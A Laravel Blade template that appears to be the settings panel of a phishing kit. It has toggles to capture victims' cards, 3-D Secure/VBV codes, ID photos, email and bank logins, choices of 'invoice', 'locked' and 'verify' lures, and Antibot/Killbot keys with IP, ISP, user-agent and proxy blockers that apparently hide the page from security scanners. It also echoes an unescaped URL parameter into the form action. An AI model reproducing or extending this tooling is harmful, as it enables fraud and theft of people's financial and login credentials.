@extends('layouts.app-auth')

@section('css')
<style>
    input[type="radio"] + label span {
        transition: background .2s,
        transform .2s;
    }

    input[type="radio"] + label span:hover,
    input[type="radio"] + label:hover span{
        transform: scale(1.2);
    } 

    input[type="radio"]:checked + label span {
        background-color: #3490DC; //bg-blue
        box-shadow: 0px 0px 0px 2px white inset;
    }

    input[type="radio"]:checked + label{
        color: #3490DC; //text-blue
    }
</style>
@endsection

@section('content')
<form action="/manage/domain/save?d=<?=@$_GET['d'];?>" method="POST">
@csrf
    <div>
    <div class="grid grid-cols-1 md:grid-cols-12 gap-8 mt-10 bg-white shadow-xl rounded-lg p-5">
        <div class="col-span-1 md:col-span-4">
            <div class="grid grid-rows-none gap-4">
                <div class="flex flex-col">
                    <label for="parameter">Parameter</label>
                    <input id="parameter" name="parameter" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="ryu" value="ryu" autocomplete="off">
                </div>
                <div class="flex flex-col">
                    <label for="default_lang">Default Language</label>
                   <select name="default_lang" id="default_lang" class="select2" style="width: 100%">
                       <option value="en">English</option>
                   </select>
                </div>
                <div class="flex flex-col">
                    <label for="case">Case</label>
                    <select name="case" id="case" class="select2" style="width: 100%">
                        <option value="invoice">Invoice</option>
                        <option value="locked">Locked</option>
                        <option value="verify">Verify</option>

                    </select>
                </div>
                <div class="flex flex-col">
                    <label for="blocked_page">Page Blocked display</label>
                    <select name="blocked_page" id="blocked_page" class="select2" style="width: 100%">
                        <option value="403">403 Forbidden</option>
                        <option value="tcp">TCP Network error</option>
                        <option value="suspend">Account suspended</option>

                    </select>

                </div>
                <div class="flex flex-col">
                    <label for="antibot">API Antibot ( optional )</label>
                    <input id="antibot" name="antibot" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXXX" autocomplete="off">
                </div>
                <div class="flex flex-col">
                    <label for="killbot">API Killbot ( optional )</label>
                    <input id="killbot" name="killbot" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXX" autocomplete="off">
                </div>
                   <div class="flex flex-col">
                    <label for="ipstack">API IPStack ( optional )</label>
                    <input id="ipstack" name="ipstack" class="appearance-none dark:bg-gray-900 border border-gray-700 rounded py-2 px-3 text-gray-900 dark:text-white  label-floating" placeholder="XXX" autocomplete="off">
                </div>
            </div>
        </div>
        <div class="col-span-1 md:col-span-4">
            <div class="grid grid-rows-none gap-4">
              
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Double Card</label>
                    @php echo radio($config,'double_card') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Get 3dsecure / VBV</label>
                    @php echo radio($config,'3dsecure') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Get Photo</label>
                    @php echo radio($config,'pap') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Get Email</label>
                    @php echo radio($config,'email') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Get Bank</label>
                    @php echo radio($config,'bank') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Lock Language</label>
                    @php echo radio($config,'lock_lang') @endphp
                </div>
            </div>
        </div>
        <div class="col-span-1 md:col-span-4">
            <div class="grid grid-rows-none gap-4">

                <div class="flex flex-col gap-y-1">
                    <label for="one_time">One Time Access</label>
                    @php echo radio($config,'one_time') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Send Login</label>
                    @php echo radio($config,'send_login') @endphp
                </div>

                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Blocker IPs</label>
                   @php echo radio($config,'ip') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Blocker UserAgent</label>
                    @php echo radio($config,'agent') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Blocker Hostname</label>
                    @php echo radio($config,'host') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Blocker ISP</label>
                    @php echo radio($config,'isp') @endphp
                </div>
                <div class="flex flex-col gap-y-1">
                    <label for="sangger">Blocker Proxy</label>
                    @php echo radio($config,'proxy') @endphp
                </div>
            </div>
        </div>
        <div class="col-span-1 md:col-span-3">
            <button type="submit" class="w-full bg-green-500 text-white rounded-full py-2">Save config</button>
        </div>
    </div>
</div>
</form>
@endsection

@section('js')
<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
<link href="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/css/select2.min.css" rel="stylesheet" />
<script src="https://cdn.jsdelivr.net/npm/select2@4.1.0-rc.0/dist/js/select2.min.js"></script>

<script>
  $(document).ready(function() {
    $('.select2').select2(
      {
        theme:'classic',
        width:'resolve'
      }
    );
});
</script>
@endsection